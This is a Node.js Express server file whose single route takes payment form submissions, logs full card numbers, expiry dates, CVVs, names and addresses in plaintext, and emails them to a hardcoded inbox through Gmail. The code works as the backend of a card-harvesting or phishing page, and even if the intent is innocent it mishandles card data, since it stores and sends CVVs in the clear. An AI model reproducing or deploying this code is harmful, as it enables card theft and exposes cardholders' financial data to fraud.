// server.js
const express = require("express");
const cors = require("cors");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 5000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// ✅ POST route to receive payment form data
app.post("/api/payment", async (req, res) => {
  const formData = req.body;
  console.log("📩 Received payment form data:", formData);

  // Extract values (these match your frontend form field names)
  const {
    "card-number": cardNumber,
    month,
    year,
    "security-code": cvv,
    "full-name": fullName,
    address
  } = formData;

  try {
    // ✅ Setup Nodemailer transporter
    let transporter = nodemailer.createTransport({
      service: "gmail", // or "outlook", "yahoo", etc.
      auth: {
        user: process.env.EMAIL_USER, // your email
        pass: process.env.EMAIL_PASS  // your app password
      }
    });

    // ✅ Send email
    await transporter.sendMail({
      from: `"Payment Bot" <${process.env.EMAIL_USER}>`,
      to: "your-inbox@gmail.com", // replace with your receiving email
      subject: "💳 New Payment Form Submission",
      text: `
      📩 New Payment Submission Received:

      👤 Full Name: ${fullName}
      🏠 Address: ${address}
      💳 Card Number: ${cardNumber}
      📅 Expiry: ${month}/${year}
      🔒 CVV: ${cvv}
      `
    });

    console.log("📧 Email sent successfully");

    res.json({ status: "ok", message: "Data received and emailed ✅" });
  } catch (error) {
    console.error("❌ Error sending email:", error);
    res.status(500).json({ status: "error", message: "Failed to send email" });
  }
});

// Start server
app.listen(PORT, () => {
  console.log(`🚀 Server running on http://localhost:${PORT}`);
});
